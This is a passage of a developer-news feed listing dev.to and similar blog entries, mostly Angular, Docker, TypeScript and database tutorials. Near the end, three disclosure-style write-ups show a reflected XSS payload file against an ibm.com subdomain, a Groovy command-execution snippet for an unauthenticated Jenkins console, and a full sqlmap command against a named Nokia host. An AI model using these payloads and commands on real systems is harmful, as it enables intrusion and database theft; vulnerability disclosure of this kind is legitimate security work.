Build an angular application.
For this stage we use a node machine image from the dockerhub https://hub.docker.com/_/node
Stage 2
Copy the angular dist folder from the previous docker machine named build on to the nginx location folder.
Then we use the default cmd that starts the nginx server. 
For this stage we will use a node machine from the dockerhub https://hub.docker.com/_/nginx
FROM node:12.7-alpine AS build
WORKDIR /app
COPY / ./
COPY package*.json ./

RUN npm install -g @angular/cli@10.0.4 && \
    npm install && \
    ng build
COPY . .

FROM nginx:1.17.1-alpine
WORKDIR /app
COPY --from=build /app/dist/ui /usr/share/nginx/html

Once that is done, we will create the Dockerfile, and build the image to run it.
> docker build -t <image_name> -f Dockerfile .

Now we can verify if the image is created by running the following command.
> docker images

Now that we have created the image in order to run it we have two options:. 
docker-compose.yml file like this:
version: '3'
services:
    server:
        image: <image_name>
        ports:
            - "80:80"
        tty: true
        expose:
            - "80" 
        stdin_open: true
        environment:
            - MODE=dev
        command: <command to run>

If we want to run a command when we run the image we can specify on command.
docker run -d -p 80:80 <image_name> command

Hope you liked and also helps you in case you have to dockerize an angular app.]]></summary>
        <author>
            <name>Guillermo Fernandez</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Azure Transparent Data Encryption]]></title>
        <id>https://dev.to/sachindra149/azure-transparent-data-encryption-2ipb</id>
        <link href="https://dev.to/sachindra149/azure-transparent-data-encryption-2ipb"/>
        <updated>2021-06-03T13:16:03.000Z</updated>
        <summary type="html"><![CDATA[Azure Transparent Data Encryption or TDE is a technique of encrypting data at rest, mainly database files, at the file level. This solves the problem of protecting the data at rest. This performs real-time encryption and decryption of the data, their associated backups, and the log files without any change in the application codebase. This concept is applicable for SQL Database, SQL Managed Instance and Azure Synapse Analytics.
TDE is called transparent because the authorized users of the database do not need to create any macros or any special configuration to be able to access the data.
TDE performs the encryption and decryption of data at the page level whereby each page is decrypted as its read into the memory and is encrypted again as its being written in to the disk. The encryption h…]]></summary>
        <author>
            <name>sachindra@work</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How to sell an npm package: A Guide]]></title>
        <id>https://dev.to/sebastianhoitz/how-to-sell-an-npm-package-a-guide-2dn9</id>
        <link href="https://dev.to/sebastianhoitz/how-to-sell-an-npm-package-a-guide-2dn9"/>
        <updated>2021-06-03T13:08:42.000Z</updated>
        <summary type="html"><![CDATA[When I quit the last company I was working at to pursue my own business adventures, building and selling a starter template or software library was high on my list of things I wanted to do.
In this guide, I would like to show you how quickly you can start selling your own npm packages or other code.
It is very easy to start selling an npm package using basetools. However, there are some prerequisites to start selling: You have to have a private Github repository inside an organization and you have to publish your package using the Github registry. But we will cover all of this within this guide.
For this guide, we will create a brand new repository on Github and start from there. If you have already created a repository, you can just skip this step.
basetools-io.

In this case, our new rep…]]></summary>
        <author>
            <name>Sebastian Hoitz</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How CIAM Software Improve Security?]]></title>
        <id>https://dev.to/jackforbes234/how-ciam-software-improve-security-4ben</id>
        <link href="https://dev.to/jackforbes234/how-ciam-software-improve-security-4ben"/>
        <updated>2021-06-03T12:43:37.000Z</updated>
        <summary type="html"><![CDATA[The customer login experience is taken over by customer identity and access management (CIAM). More than just registration and authentication are at risk. If your company isn't employing CIAM, you risk slipping behind competitors who are using the technology and collecting customer data.
For a safe and seamless customer experience, CIAM delivers the ease of a centralized customer database that integrates all other apps and services. 
A CIAM solution will often include customer registration, self-service account management, consent and preferences management, single sign-on (SSO), multi-factor authentication (MFA), access management, directory services, and data access governance.
Standard Benefits of CIAM:
Streamlined Customer Experience
A company's simplified customer experience implies t…]]></summary>
        <author>
            <name>Jack Forbes</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Angular 12 in Depth]]></title>
        <id>https://dev.to/angular/angular-12-in-depth-1j6m</id>
        <link href="https://dev.to/angular/angular-12-in-depth-1j6m"/>
        <updated>2021-06-03T11:32:35.000Z</updated>
        <summary type="html"><![CDATA[In this article, I’ll go over (almost) everything noteworthy in this brand new release. I’ll also highlight what’s changed around Angular, just like I did with my previous articles about Angular 11 and Angular 10.
If you're just looking for the bird-eye view, then check out the official release announcement. Here, I'll dig much deeper into the release notes.
The Angular team has been working on Ivy (the new compilation & rendering pipeline) since 2018. It was finally released with Angular 8. Since Angular 9, Ivy has been the default for new projects, and the ecosystem is slowly migrating to it. With Angular 12, the old View Engine is now officially deprecated. It will be removed in a future major release. Also, it won't be possible to create new applications using View Engine. Finally, Ivy…]]></summary>
        <author>
            <name>Sébastien D.</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How To Learn And Become A Magento Developer?]]></title>
        <id>https://dev.to/marymartinjr/how-to-learn-and-become-a-magento-developer-25im</id>
        <link href="https://dev.to/marymartinjr/how-to-learn-and-become-a-magento-developer-25im"/>
        <updated>2021-06-03T11:19:48.000Z</updated>
        <summary type="html"><![CDATA[Magento is one of the leading eCommerce development platforms that offer a definite solution for businesses of all sizes and types. It gives you the flexibility to add more capabilities to your current system and allows you to move on the go. It is a scalable, affordable, and feature-rich platform that also gives the convenience of development to the developers for building eCommerce applications.
If you are thinking of learning Magento, you have made a good decision. There is a huge scope offered by the technology; even after the launch of competitive technologies such as WooCommerce, the growth of Magento has been unaffected. In fact, it has been retaining its no.1 position for years. A technology that has ruled the market steadily and sparks innovations, this is a combination that would…]]></summary>
        <author>
            <name>Mary Martin</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[DevOps Strategy and Automation Solution for Financial Company]]></title>
        <id>https://dev.to/softwebsub/devops-strategy-and-automation-solution-for-financial-company-5d1g</id>
        <link href="https://dev.to/softwebsub/devops-strategy-and-automation-solution-for-financial-company-5d1g"/>
        <updated>2021-06-03T11:04:56.000Z</updated>
        <summary type="html"><![CDATA[DoubleCheck - a financial service company was trying to find a way to link their current systems with credit unions and banking core systems. They ultimately aimed to automate several processes. Our DevOps engineers consulted the company and learned about the system issues, along with their development and deployment processes.
Get Your Free Copy Now
After a thorough evaluation, we identified their architectural flaws and proposed a DevOps strategy. We fixed the bugs in their code and helped them scale their services by automating their CI/CD pipelines. Our client now has flexibility with its streamlined processes and leverages the well-functioning databases and applications.
Key Features:
Agility and flexibility
Integration efficiency
Cost reduction
Regulations compliance
Extended legacy
Faster time-to-market
Increase profitability]]></summary>
        <author>
            <name>Bharat</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Top 5 Technologies to Develop Microservices Architecture]]></title>
        <id>https://dev.to/weblineindia/top-5-technologies-to-develop-microservices-architecture-34la</id>
        <link href="https://dev.to/weblineindia/top-5-technologies-to-develop-microservices-architecture-34la"/>
        <updated>2021-06-03T11:01:00.000Z</updated>
        <summary type="html"><![CDATA[Developers have now started leveraging microservices architecture because several small services ensure that complex and large applications function cohesively. Several tech giants have moved to microservices, like Netflix, Amazon, Twitter, Spotify, etc. 
Now if you also want to develop microservices architecture, a common question will pop up in your mind regarding which language would be the best for your project. Before jumping on to the best technologies to build microservice architecture, let us know what it is. 
The microservices architecture refers to a development procedure where a single application can be fragmented into a series of several more minor services. The services then execute in their process and also interact with lightweight mechanisms. Microservices are established …]]></summary>
        <author>
            <name>Vikrant Bhalodia</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Managing Shared State In Vue 3]]></title>
        <id>https://smashingmagazine.com/2021/06/managing-shared-state-vue3/</id>
        <link href="https://smashingmagazine.com/2021/06/managing-shared-state-vue3/"/>
        <updated>2021-06-03T10:30:00.000Z</updated>
        <summary type="html"><![CDATA[Writing large-scale Vue applications can be a challenge. In this article, Shawn Wildermuth dives into the pros and cons of approaches like factories, shared objects, and using Vuex. He also explains what is coming in Vuex 5.0 that might change how we all use shared state in Vue 3.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Shawn Wildermuth)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Top 11 Email Security Risks in 2021]]></title>
        <id>https://dev.to/araz_guidanian/top-11-email-security-risks-in-2021-2opd</id>
        <link href="https://dev.to/araz_guidanian/top-11-email-security-risks-in-2021-2opd"/>
        <updated>2021-06-03T09:37:50.000Z</updated>
        <summary type="html"><![CDATA[Today's email security threats are multiplying at an unprecedented rate. Many organizations are also vulnerable to spear-phishing, whale phishing, ransomware, and other malware attacks. As a result, large and small businesses must devise strategies to protect against emerging email security threats. More than 91% of cyber attacks are now launched via email, and email remains the weakest point in the security chain. 
Due to the rising demand for online communication, email remains a top security issue or even a weakness in 2021. When it comes to email protection, traditional measures such as the most up-to-date antivirus software will never be able to prevent cyber-attacks, especially advanced social engineering attacks. What are the top email security risks?
In an email spoofing case, a cy…]]></summary>
        <author>
            <name>Araz Guidanian</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How to use ControlValueAccessor to enhance date input with automatic conversion and validation]]></title>
        <id>https://dev.to/shhdharmen/how-to-use-controlvalueaccessor-to-enhance-date-input-with-automatic-conversion-and-validation-3lo4</id>
        <link href="https://dev.to/shhdharmen/how-to-use-controlvalueaccessor-to-enhance-date-input-with-automatic-conversion-and-validation-3lo4"/>
        <updated>2021-06-03T09:26:56.000Z</updated>
        <summary type="html"><![CDATA[Overall idea behind this article to explain and demonstrate the usage of ControlValueAccessor and Validator interfaces . The former is used to bind together a FormControl from Forms package and native DOM elements. The latter is used to implement validation logic. They can exist independently of each other, but in this article we’ll implement both using a single directive. Our directive will add the following functionality to the application:
Conversion between input value and control value
Validation for invalid date
If you’re using ControlValueAccessor for the first time, I would recommend going through this article first: Never again be confused when implementing ControlValueAccessor in Angular forms. 
We will first create a directive and handle conversion between UI and control value.
…]]></summary>
        <author>
            <name>Dharmen Shah</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How to use ControlValueAccessor to enhance date input with automatic conversion and validation]]></title>
        <id>https://dev.to/shhdharmen/how-to-use-controlvalueaccessor-to-enhance-date-input-with-automatic-conversion-and-validation-3lo4</id>
        <link href="https://dev.to/shhdharmen/how-to-use-controlvalueaccessor-to-enhance-date-input-with-automatic-conversion-and-validation-3lo4"/>
        <updated>2021-06-03T09:26:56.000Z</updated>
        <summary type="html"><![CDATA[Overall idea behind this article to explain and demonstrate the usage of ControlValueAccessor and Validator interfaces . The former is used to bind together a FormControl from Forms package and native DOM elements. The latter is used to implement validation logic. They can exist independently of each other, but in this article we’ll implement both using a single directive. Our directive will add the following functionality to the application:
Conversion between input value and control value
Validation for invalid date
If you’re using ControlValueAccessor for the first time, I would recommend going through this article first: Never again be confused when implementing ControlValueAccessor in Angular forms. 
We will first create a directive and handle conversion between UI and control value.
…]]></summary>
        <author>
            <name>Dharmen Shah</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How I Got Selected into Google Summer of Code]]></title>
        <id>https://dev.to/rohanlekhwani/how-i-got-selected-into-google-summer-of-code-27</id>
        <link href="https://dev.to/rohanlekhwani/how-i-got-selected-into-google-summer-of-code-27"/>
        <updated>2021-06-03T08:55:25.000Z</updated>
        <summary type="html"><![CDATA[More than 50,000 students around the world register for GSoC every year and of those who submit a proposal only 1200 are accepted.
Organizations at GSoC work within Operating Systems to Web to Cloud and even applications within Science and Medicine thereby covering almost the entire spectrum of Computer Science.
I got selected by Rocket.Chat.

Rocket.Chat is the ultimate communication platform for teams — say an open-sourced Slack with a different business model.
It offers web and phone based communication platforms, integrated omnichannel features and even has an App Store of its own where you can publish and monetize apps that run on Rocket.Chat!
Selecting Organizations
Around December, I started going through organizations that got selected into GSoC the past year and shortlisting them …]]></summary>
        <author>
            <name>Rohan Lekhwani</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[TS: Documenting Functions]]></title>
        <id>https://dev.to/apetrides/ts-documenting-functions-1e3j</id>
        <link href="https://dev.to/apetrides/ts-documenting-functions-1e3j"/>
        <updated>2021-06-03T08:45:04.000Z</updated>
        <summary type="html"><![CDATA[A useful feature in TypeScript that I seemed to have glossed over in my learnings has been 'documentation comments'.
In short, they enable you document functions in a clean and simply way and is understood by modern code editors such as VS Code.
Take the below function to demonstrate:
/**
 * Adds 2 numbers together
 *
 * @param value1 - The first number
 * @param value2 - The second number
 * @returns Returns the sum of 2 numbers
 *
 */
const sumIt = (value1: number, value2: number): number => {
  return value1 + value2;
}

If you open this in VS Code as a .ts file, then hover over your function name, you get the following interation:

Similarly, if you simply hover over one of the function arguments, you get the documentation comment specific to that argument:

To close, I find this a pretty awesome feature for situations where you may have a particularly complex function, where some human readable and interactive comments can really help to self-document and reduce complexity.]]></summary>
        <author>
            <name>Anthony Petrides</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[GetBlock Nodes Provider Shows Their Records For May '21]]></title>
        <id>https://dev.to/getblockio/getblock-nodes-provider-shows-their-records-for-may-21-35hg</id>
        <link href="https://dev.to/getblockio/getblock-nodes-provider-shows-their-records-for-may-21-35hg"/>
        <updated>2021-06-03T08:20:34.000Z</updated>
        <summary type="html"><![CDATA[Since May 2021 has come to an end, as usual, we’re ready to share our news and updates with the developer community. The past month brought you a new GetBlock product, several partnerships, a discount offer for dedicated nodes, new docs and developer guides, and way more!
Raw blockchain data for dedicated nodes is now live on GetBlock in Beta mode!
Normally, when you retrieve blockchain data from a node, you receive a response in readable insights on a block height or transaction. Raw data is a non-processed encrypted code that can be used by developers for performing advanced analytics, conducting data analysis or building a node client.

Currently, information in a raw format can be provided for Bitcoin (including its derivatives, Bitcoin Cash, Bitcoin SV, Litecoin, Bitcoin Gold, etc.), …]]></summary>
        <author>
            <name>GetBlock</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[देसी  भाषा में एक्सट्रीम बिगिनर्स के लिए डॉकर :) Layman Docker ( translate in ur language too)]]></title>
        <id>https://dev.to/manishfoodtechs/layman-docker-translate-in-ur-language-too-5g1</id>
        <link href="https://dev.to/manishfoodtechs/layman-docker-translate-in-ur-language-too-5g1"/>
        <updated>2021-06-03T08:11:15.000Z</updated>
        <summary type="html"><![CDATA[*** छोटा सा अनुरोध अनुरोध:***



  
  
  मेरी टीम शामिल होने के लिए फॉर्म में शामिल होने के लिए आपका स्वागत है।



  
  
  इसके अलावा ओपन सोर्स इंटेलिजेंट सिस्टम (OSINT) में शामिल होने के लिए आपका स्वागत है यदि आप कोरोना प्रकोप जैसी विभिन्न बीमारियों से मनुष्यों की रक्षा के संबंध में ओपन सोर्स प्रोजेक्ट में मदद कर सकते हैं



  
  
  https://github.com/Manishfoodtechs/OSINTHRH/wiki


मैंने सर्वर, क्लाउड और कंटेनरों पर शुरुआती लोगों के लिए सरल भाषा में विभिन्न लेख लिखे हैं। आप मेरी प्रोफाइल पर जाकर उन्हें ढूंढ सकते हैं। ऐसा ही एक लेख यहां फिर से अलग शीर्षक के साथ है।
स्तर शून्य: डेस्कटॉप और सर्वर के बीच अंतर



  
  
  डेस्कटॉप क्या है? एक डेस्कटॉप में सीपीयू, रैम, हार्ड ड्राइव आदि और ऑपरेटिंग सिस्टम होता है। यह ऑपरेटिंग सिस्टम विंडोज, लिनक्स, मैक आदि हो सकता है। आपके पास डेस्कटॉप में ग्राफ…]]></summary>
        <author>
            <name>manish srivastava</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How to never type passwords when using Git]]></title>
        <id>https://dev.to/github/how-to-never-type-passwords-when-using-git-18bb</id>
        <link href="https://dev.to/github/how-to-never-type-passwords-when-using-git-18bb"/>
        <updated>2021-06-03T06:54:01.000Z</updated>
        <summary type="html"><![CDATA[Have you been using Git on the command line? Notice how you have to always type in your password? Not only is this SUPER annoying, it also presents a security issue. Here's a bunch of ways to authenticate Git so you don't have to type a password with every action. It will also keep your code more safe and secure.
If you're using Git and GitHub then there are a few ways to authenticate to ensure your code is secure.
If you work in tech, you've probably heard the term SSH keys. The term often comes up when you're trying to login or use a cloud service outside a web browser. It's also a term associated with connecting from one machine to another.
SSH or Secure Shell keys is the name of the key (or protocol) used when you need to authenticate in order to use a provider. Using SSH protocol make…]]></summary>
        <author>
            <name>Michelle Mannering</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Sharing contracts]]></title>
        <id>https://dev.to/jackmellis/sharing-contracts-4nad</id>
        <link href="https://dev.to/jackmellis/sharing-contracts-4nad"/>
        <updated>2021-06-03T06:32:18.000Z</updated>
        <summary type="html"><![CDATA[This is a concept that really drives home how nice it is when your entire stack is written in the same language. I am using node/typescript on the backend which means I can share stuff between the ui and api.
I have a separate repo that holds common stuff like error codes, request payloads and response payloads:
// Contracts
export interface SearchProductsRequest {
  page: number;
  q: string;
}

export interface SearchProductsResponse {
  nextPage: number;
  products: Product[];
}

Then I can use that to bridge the gap between api and ui:
// API
async function searchProductsApi(
  req: Request<void, void, void, SearchProductsRequest>,
  res: Response<SearchProductsResponse>
) {
  // req.query is strongly typed
  const result = await search(req.query);

  // res.send will throw a ts error if result doesn't match the response
  res.status(200).send(result);
}

// UI
// (driver is a simple wrapper around the fetch api)
async function searchProducts(args) {
  // data will be strongly typed
  const { data } = await driver<SearchProductsRequest, SearchProductsResponse>({
    url: "/products",
    // will throw a ts error is args doesn't match the request
    data: args,
  });
}

Now both sides of my application can have confidence that they will be receiving/sending the same payloads!]]></summary>
        <author>
            <name>Jack</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Sharing contracts]]></title>
        <id>https://dev.to/jackmellis/sharing-contracts-4nad</id>
        <link href="https://dev.to/jackmellis/sharing-contracts-4nad"/>
        <updated>2021-06-03T06:32:18.000Z</updated>
        <summary type="html"><![CDATA[This is a concept that really drives home how nice it is when your entire stack is written in the same language. I am using node/typescript on the backend which means I can share stuff between the ui and api.
I have a separate repo that holds common stuff like error codes, request payloads and response payloads:
// Contracts
export interface SearchProductsRequest {
  page: number;
  q: string;
}

export interface SearchProductsResponse {
  nextPage: number;
  products: Product[];
}

Then I can use that to bridge the gap between api and ui:
// API
async function searchProductsApi(
  req: Request<void, void, void, SearchProductsRequest>,
  res: Response<SearchProductsResponse>
) {
  // req.query is strongly typed
  const result = await search(req.query);

  // res.send will throw a ts error if result doesn't match the response
  res.status(200).send(result);
}

// UI
// (driver is a simple wrapper around the fetch api)
async function searchProducts(args) {
  // data will be strongly typed
  const { data } = await driver<SearchProductsRequest, SearchProductsResponse>({
    url: "/products",
    // will throw a ts error is args doesn't match the request
    data: args,
  });
}

Now both sides of my application can have confidence that they will be receiving/sending the same payloads!]]></summary>
        <author>
            <name>Jack</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Angular : How to add reCAPTCHA feature in your angular app just in 5 minutes?]]></title>
        <id>https://dev.to/rajeshkumaryadavdotcom/angular-how-to-add-recaptcha-feature-in-your-angular-app-just-in-5-minutes-3lh0</id>
        <link href="https://dev.to/rajeshkumaryadavdotcom/angular-how-to-add-recaptcha-feature-in-your-angular-app-just-in-5-minutes-3lh0"/>
        <updated>2021-06-03T06:10:20.000Z</updated>
        <summary type="html"><![CDATA[Step 1 - Install dependency
npm i ng-recaptcha --save

Step -2 Open app.module.ts and add below import-
import { RecaptchaModule } from 'ng-recaptcha';

Also add this to imports -
imports: [RecaptchaModule,],

Step 3 - Open that component where you want to add human verification reCAPTCHA and then add below code -

yourcomponentname.component.html
 <re-captcha (resolved)="resolved($event)" siteKey="6LcOuyYTAAAAAHTjFuqhA52fmfJ_j5iFk5PsfXaU" ></re-captcha>

yourcomponentname.component.ts
public resolved(captchaResponse: string) { 
console.log(`Resolved captcha with response: ${captchaResponse}`); // Write your logic here about once human verified what action you want to perform 
}

Step 5 - This siteKey will work on localhost, you must have to generate your own siteKey, for this please visit google.com/recaptcha and add your domain and generate key, it's very simple and then replace the new key to markup of step3.  
All done.]]></summary>
        <author>
            <name>Rajesh Kumar Yadav</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Angular : How to add reCAPTCHA feature in your angular app just in 5 minutes?]]></title>
        <id>https://dev.to/rajeshkumaryadavdotcom/angular-how-to-add-recaptcha-feature-in-your-angular-app-just-in-5-minutes-3lh0</id>
        <link href="https://dev.to/rajeshkumaryadavdotcom/angular-how-to-add-recaptcha-feature-in-your-angular-app-just-in-5-minutes-3lh0"/>
        <updated>2021-06-03T06:10:20.000Z</updated>
        <summary type="html"><![CDATA[Step 1 - Install dependency
npm i ng-recaptcha --save

Step -2 Open app.module.ts and add below import-
import { RecaptchaModule } from 'ng-recaptcha';

Also add this to imports -
imports: [RecaptchaModule,],

Step 3 - Open that component where you want to add human verification reCAPTCHA and then add below code -

yourcomponentname.component.html
 <re-captcha (resolved)="resolved($event)" siteKey="6LcOuyYTAAAAAHTjFuqhA52fmfJ_j5iFk5PsfXaU" ></re-captcha>

yourcomponentname.component.ts
public resolved(captchaResponse: string) { 
console.log(`Resolved captcha with response: ${captchaResponse}`); // Write your logic here about once human verified what action you want to perform 
}

Step 5 - This siteKey will work on localhost, you must have to generate your own siteKey, for this please visit google.com/recaptcha and add your domain and generate key, it's very simple and then replace the new key to markup of step3.  
All done.]]></summary>
        <author>
            <name>Rajesh Kumar Yadav</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How An App Crash Made Us Build Another App - Story of Scriptified]]></title>
        <id>https://dev.to/guptaji6/how-an-app-crash-made-us-build-another-app-story-of-scriptified-1c1m</id>
        <link href="https://dev.to/guptaji6/how-an-app-crash-made-us-build-another-app-story-of-scriptified-1c1m"/>
        <updated>2021-06-03T04:23:04.000Z</updated>
        <summary type="html"><![CDATA[A project we started in June'20 which was planned to launch for Hacktoberfest but didn't, was finally launched in Mar'21. Yay! Introducing to you - Scriptified.
Scriptified is your go-to curated newsletter which sends insightful weekly newsletters in your inbox covering numerous topics around JavaScript & React ecosystem.
It all started with the scariest nightmare of any developer in the world - the 💥 crash of their production app. The first-ever collaborative open source project we launched together - Smart Apart, stopped working one day which led to us building Scriptified.
Let me set up the context for you.
Prateek and I were college batchmates who share a mutual love for JavaScript. Our journey started when we attended an AngularJS & Ionic Framework boot camp in our sophomore year. In…]]></summary>
        <author>
            <name>Ayush Gupta</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Add PostgreSQL to Express Server]]></title>
        <id>https://dev.to/achukka/add-postgresql-to-express-server-2f0k</id>
        <link href="https://dev.to/achukka/add-postgresql-to-express-server-2f0k"/>
        <updated>2021-06-03T04:17:33.000Z</updated>
        <summary type="html"><![CDATA[In this section, we will add postgres database connection to node server written in express.
An Express Node Server running locally or in a remote server.
Please check our earlier post on routing requests on a node server
A PostgreSQL database running locally or in a remote server.
If you are feeling ambitious, please refer to this commit for source code
Download and install latest version of PostgreSQL
At the time of writing this post, the latest version if 13.3
Create a database initialization script init.sql


Create table for item




-- Create Table item
CREATE IF NOT EXISTS TABLE item (
    id NUMERIC PRIMARY KEY,
    task VARCHAR(250) NOT NULL,
    priority NUMERIC NOT NULL,
    date TIMESTAMP DEFAULT NOW()
);

Add an initial set of items



-- Insert initial set of items
INSERT INT…]]></summary>
        <author>
            <name>Aditya Chukka</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Add PostgreSQL to Express Server]]></title>
        <id>https://dev.to/achukka/add-postgresql-to-express-server-2f0k</id>
        <link href="https://dev.to/achukka/add-postgresql-to-express-server-2f0k"/>
        <updated>2021-06-03T04:17:33.000Z</updated>
        <summary type="html"><![CDATA[In this section, we will add postgres database connection to node server written in express.
An Express Node Server running locally or in a remote server.
Please check our earlier post on routing requests on a node server
A PostgreSQL database running locally or in a remote server.
If you are feeling ambitious, please refer to this commit for source code
Download and install latest version of PostgreSQL
At the time of writing this post, the latest version if 13.3
Create a database initialization script init.sql


Create table for item




-- Create Table item
CREATE IF NOT EXISTS TABLE item (
    id NUMERIC PRIMARY KEY,
    task VARCHAR(250) NOT NULL,
    priority NUMERIC NOT NULL,
    date TIMESTAMP DEFAULT NOW()
);

Add an initial set of items



-- Insert initial set of items
INSERT INT…]]></summary>
        <author>
            <name>Aditya Chukka</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[An actual complete guide to typescript monorepos]]></title>
        <id>https://dev.to/cryogenicplanet/an-actual-complete-guide-to-typescript-monorepos-240l</id>
        <link href="https://dev.to/cryogenicplanet/an-actual-complete-guide-to-typescript-monorepos-240l"/>
        <updated>2021-06-03T00:23:44.000Z</updated>
        <summary type="html"><![CDATA[When I was setting up our production monorepo at modfy.video, I found most typescript monorepo guides were quite lacking in addressing a lot of more detailed problems you run into or how to solve them with modern solutions.
This guide aims to do that for 2021, with the best in class tooling at this time. That said when using modern advanced tooling, you can and will run into some compatibility problems so this guide might be slightly esoteric for you.
This guide is really optimized towards typescript monorepos that also contain packages that can be deployed but really should work for any typescript monorepos.
For this guide, we will be using pnpm but this should mostly work the space with yarn just swap out pnpm workspaces with yarn workspaces. (This will likely not work well with npm and …]]></summary>
        <author>
            <name>Rahul Tarak</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[What is Commit Signing in Git?]]></title>
        <id>60afce3011ffb70827ef869c</id>
        <link href="https://www.freecodecamp.org/news/what-is-commit-signing-in-git/"/>
        <updated>2021-06-02T23:14:01.000Z</updated>
        <summary type="html"><![CDATA[Git has a feature to "sign" commits, but what is signing, and what are the benefits? TL;DR: If you don't care for the details, and just need to get commit signing setup quickly, skip to How to Sign Commits. Signing, or code signing specifically, is the process of using]]></summary>
        <author>
            <name>freeCodeCamp.org</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How to Use Environment Variables in VanillaJS]]></title>
        <id>60b3a25211ffb70827ef9b39</id>
        <link href="https://www.freecodecamp.org/news/how-to-use-environment-variables-in-vanillajs/"/>
        <updated>2021-06-02T22:54:18.000Z</updated>
        <summary type="html"><![CDATA[In this article, you will learn about environment variables in Vanilla JavaScript. You'll also learn how to serve API keys to your application through the Netlify build command. What are JavaScript environment variables?Environment variables are very common when you're using JavaScript frameworks like React or Vue for creating frontend]]></summary>
        <author>
            <name>freeCodeCamp.org</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Reflected XSS by jsonp on ibm.com subdomain]]></title>
        <id>https://dev.to/knassar702/reflected-xss-by-jsonp-on-ibm-com-subdomain-5aia</id>
        <link href="https://dev.to/knassar702/reflected-xss-by-jsonp-on-ibm-com-subdomain-5aia"/>
        <updated>2021-06-02T22:43:57.000Z</updated>
        <summary type="html"><![CDATA[hi :D 
https://www-356.ibm.com/partnerworld/wps/servlet/pwdyn/pw/rss/rsstojson.jsp?ccdb=no&rssurl=https://www-2000.ibm.com/file.xml&_=1596170198353
rssurl parameter and covert the content from XML to jsonp

but in headers, content-type: text/html, this allowed to execute HTML tags in this page , so I've created an XML file with XSS payload and upload it on my website https://knassar702.github.io/xss.xml
rssurl parameter
<html>
        <head></head>
        <body>
                <something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
                <a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(2)</a:script>
                <info>
                  <name>
                    <value><![CDATA[<img src=x onerror=confirm(document.domain)>]]]]><![CDATA[></value>
                  </name>
                    <description>
                      <value>Hello</value>
                    </description>
                    <url>
                      <value>http://google.com</value>
                    </url>
                </info>
        </body>
</html>


Done :D]]></summary>
        <author>
            <name>Khaled Nassar</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Remote Code Execution on ibm.com subdomain]]></title>
        <id>https://dev.to/knassar702/remote-code-execution-on-ibm-com-subdomain-4k96</id>
        <link href="https://dev.to/knassar702/remote-code-execution-on-ibm-com-subdomain-4k96"/>
        <updated>2021-06-02T22:42:11.000Z</updated>
        <summary type="html"><![CDATA[i've found Jenkins on acc11-blr-dev-01.sl1694431.sl.edst.ibm.com does not require authentication for access dashboard

everything , add/delete admin accounts,service,configuration,etc ..

but the intersing path is /script , you can write Jenkins script 
def command = "YOUR_COMMAND"
def proc = command.execute()
proc.waitFor()
println "Process exit code: ${proc.exitValue()}"
println "Std Err: ${proc.err.text}"
println "Std Out: ${proc.in.text}"


Thanks]]></summary>
        <author>
            <name>Khaled Nassar</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[SQL inection on gdclive.nokia.com]]></title>
        <id>https://dev.to/knassar702/sql-inection-on-gdclivenokia-com-c7c</id>
        <link href="https://dev.to/knassar702/sql-inection-on-gdclivenokia-com-c7c"/>
        <updated>2021-06-02T22:39:09.000Z</updated>
        <summary type="html"><![CDATA[Hi , this blog about SQL Injection in Nokia.com Allowed me to Dump all database
when im visiting this domain gdclive.nokia.com i've found something
First : this domain has been used an old version of Joomla CMS
let's scan it using joomscan tool for dumping all informations about joomla (plugins , version ,etc..)
All results :
Joomla Version : 3.1
Plugins : JCK Editor (6.4.4)

searching for JCK Editor in exploit-db.com
https://www.exploit-db.com/exploits/45423

Worked ..!
this is the time of SQLMAP Tool

$ sqlmap -u 'https://gdclive.nokia.com/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=' --level=5 --risk=3 --random-agent --technique=U -p parent --batch --current-db --current-user


you can see the current user and the name of database :)
--all option and unencrypt the password of admin account let's login in admin panel

You can see this video about this bug

Thanks ;0]]></summary>
        <author>
            <name>Khaled Nassar</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[React multi-step form]]></title>
        <id>https://dev.to/nicolastrahan/react-multi-step-form-910</id>
        <link href="https://dev.to/nicolastrahan/react-multi-step-form-910"/>
        <updated>2021-06-02T22:15:06.000Z</updated>
        <summary type="html"><![CDATA[There's a ton of HTML multi-step form examples out there: see https://csshint.com/multi-step-html-forms/ for instance. So why create another one? Simply put, I couldn't find a form that satisfied my two main requirements:
1) Responsive. The form should look good on a phone, a desktop, and everything in between. It's 2021 and most web traffic now goes  through mobile devices, so making your pages responsive should be a top priority.
I was also looking for the following:
Here's what I came up with:




